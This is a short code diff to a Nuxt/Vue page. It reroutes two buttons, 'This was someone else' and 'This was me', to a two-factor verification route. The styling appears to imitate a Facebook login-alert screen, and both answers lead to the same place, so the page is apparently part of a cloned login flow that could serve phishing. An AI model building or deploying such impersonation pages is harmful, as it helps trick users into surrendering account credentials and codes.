@@ -62,13 +62,13 @@ const handleSubmit = async () => {
         class="max-md:flex-col-reverse max-md:gap-2 flex justify-end text-[12px] md:border-t py-[8px] px-[10px] md:bg-[#f2f2f2] md:border-[#ccc] mt-[10px]"
       >
         <NuxtLink
-          to="/step-1"
+          to="/two_step_verification/two_factor"
           class="max-md:w-full w-fit border border-[#ccd0d5] rounded-[2px] px-[10px] flex justify-center items-center text-[#4b4f56] bg-[#f5f6f7] h-[28px]"
         >
           This was someone else
         </NuxtLink>
         <NuxtLink
-          to="/step-1"
+          to="/two_step_verification/two_factor"
           class="max-md:w-full w-fit md:ml-1 bg-[#4267b2] border border-[#4267b2] rounded-[2px] px-[10px] flex justify-center items-center text-white h-[28px]"
         >
           This was me
